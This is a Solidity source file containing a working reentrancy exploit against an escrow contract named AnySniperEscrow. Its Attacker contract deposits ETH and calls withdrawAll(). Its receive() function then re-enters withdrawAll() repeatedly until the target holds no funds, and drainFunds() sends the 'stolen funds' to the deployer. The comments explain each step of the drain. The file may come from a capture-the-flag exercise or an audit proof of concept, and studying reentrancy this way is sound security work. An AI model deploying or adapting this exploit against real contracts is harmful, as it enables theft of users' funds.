// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

/**
 * @title IVulnerable
 * @dev Interface for the vulnerable AnySniperEscrow contract.
 * It includes the functions necessary for the attack: deposit, withdrawAll, and bids.
 */
interface IVulnerable {
    /// @dev Deposits ETH into the caller's balance.
    function deposit() external payable;

    /// @dev The vulnerable function which transfers the caller's entire balance.
    /// This function is vulnerable to reentrancy because it sends ETH before
    /// updating the user's balance to zero.
    function withdrawAll() external;

    /// @dev Returns the balance of a given address.
    function bids(address) external view returns (uint256);
}

/**
 * @title Attacker
 * @dev This contract exploits a reentrancy vulnerability in the AnySniperEscrow contract.
 * The attack proceeds as follows:
 * 1. The attacker calls the `attack()` function with some ETH (e.g., 1 ETH).
 * 2. The `attack()` function deposits this ETH into the vulnerable `AnySniperEscrow` contract.
 * 3. The `attack()` function then calls `withdrawAll()` on the vulnerable contract.
 * 4. `AnySniperEscrow`'s `withdrawAll()` function reads the attacker's balance (1 ETH) and sends it
 *    to the attacker contract via a low-level `call`.
 * 5. This `call` triggers the `receive()` function in this Attacker contract.
 * 6. Inside `receive()`, before the vulnerable contract can update the attacker's balance to 0,
 *    the attacker contract re-enters the `withdrawAll()` function.
 * 7. Since the balance has not been updated, the `require(amount > 0)` check passes again,
 *    and the vulnerable contract sends another 1 ETH.
 * 8. This loop continues until the vulnerable contract is drained of its funds.
 */
contract Attacker {
    IVulnerable public target;
    address public owner;

    /// @dev Sets the address of the vulnerable contract.
    constructor(address _target) {
        target = IVulnerable(_target);
        owner = msg.sender;
    }

    /**
     * @dev The re-entry point.
     * This function is triggered when the vulnerable contract sends ETH.
     * It checks if the target still has ETH and re-enters `withdrawAll` to drain it.
     */
    receive() external payable {
        // If the vulnerable contract still has a balance, call withdrawAll() again.
        if (address(target).balance > 0) {
            target.withdrawAll();
        }
    }

    /**
     * @dev Starts the attack.
     * The caller must send some ETH to be deposited into the target contract.
     */
    function attack() external payable {
        require(msg.value > 0, "Must deposit some ETH to start the attack");

        // Step 1: Deposit ETH into the vulnerable contract to establish a balance.
        target.deposit{value: msg.value}();

        // Step 2: Call the vulnerable withdraw function to trigger the reentrancy loop.
        target.withdrawAll();
    }

    /**
     * @dev Allows the owner to withdraw the stolen funds from this contract.
     */
    function drainFunds() external {
        require(msg.sender == owner, "Only the owner can drain funds");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Failed to withdraw funds");
    }
}